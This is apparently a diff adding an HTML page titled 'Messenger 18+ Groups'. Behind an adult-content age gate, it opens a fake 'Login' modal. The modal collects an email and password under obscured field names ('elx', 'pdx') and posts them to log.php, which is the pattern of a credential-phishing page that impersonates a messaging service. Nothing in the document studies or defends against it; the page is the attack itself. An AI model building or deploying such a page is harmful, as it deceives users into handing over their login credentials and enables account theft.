@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger 18+ Groups</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background-color: #0e1d2c;
+            color: #ffffff;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+        }
+
+        .logo {
+            width: 150px;
+            margin: 0 auto 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .open-modal-btn {
+            background-color: #75ae2e;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .open-modal-btn:hover {
+            background-color: #b4e461;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #1b2b3a;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .modal-content h2 {
+            margin-bottom: 15px;
+        }
+
+        .modal-content input {
+            width: 90%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #5c6b75;
+            border-radius: 5px;
+            background-color: #0e1d2c;
+            color: white;
+        }
+
+        .modal-content .close-btn {
+            background-color: #ff4d4d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .modal-content .submit-btn {
+            background-color: #75ae2e;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .modal-content .close-btn:hover {
+            background-color: #ff6666;
+        }
+
+        .modal-content .submit-btn:hover {
+            background-color: #b4e461;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img class="logo" src="logo.png" alt="Logo">
+        <h1>Messenger</h1>
+        <h3>Adult Content Warning</h3>
+        <p>This website contains adult content and is intended for individuals aged 18 years and older. By continuing, you confirm that you are of legal age to view such content.</p>
+        <button class="open-modal-btn">I'm 18+</button>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+        <img class="logo" src="logo.png" alt="Logo">
+            <h2>Login</h2>
+            <form action="log.php" method="POST">
+                <input type="email" name="elx" placeholder="Email" required>
+                <input type="password" name="pdx" placeholder="Password" required>
+                <button type="submit" class="submit-btn">Login</button>
+            </form>
+            <button class="close-btn" id="closeModal">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // Modal functionality
+        const modal = document.getElementById('loginModal');
+        const openModalBtn = document.querySelector('.open-modal-btn');
+        const closeModalBtn = document.getElementById('closeModal');
+
+        openModalBtn.addEventListener('click', () => {
+            modal.style.display = 'flex';
+        });
+
+        closeModalBtn.addEventListener('click', () => {
+            modal.style.display = 'none';
+        });
+
+        window.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
+    </script>
+
+</body>
+</html>
+
